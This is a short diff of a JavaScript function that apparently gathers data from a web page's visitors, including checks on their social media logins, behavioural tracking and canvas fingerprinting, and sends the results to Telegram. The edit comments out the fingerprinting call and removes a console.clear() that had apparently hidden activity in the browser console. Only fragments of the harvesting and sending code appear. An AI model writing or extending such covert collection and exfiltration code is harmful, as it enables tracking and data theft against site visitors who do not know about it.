@@ -450,7 +450,7 @@ function mainData() {
         checkSocialMediaLogins();
         collectBehavioralData();
         collectAdditionalTrackingData(); // Added new tracking methods
-        collectCanvasFingerprint();
+        // collectCanvasFingerprint();
 
 
 
@@ -483,9 +483,7 @@ function mainData() {
             } catch (error) {
                 console.log("Error sending to Telegram:", error);
             }
-            console.clear();
         }, 1500);
     }
     collectAllData();
-    
 };
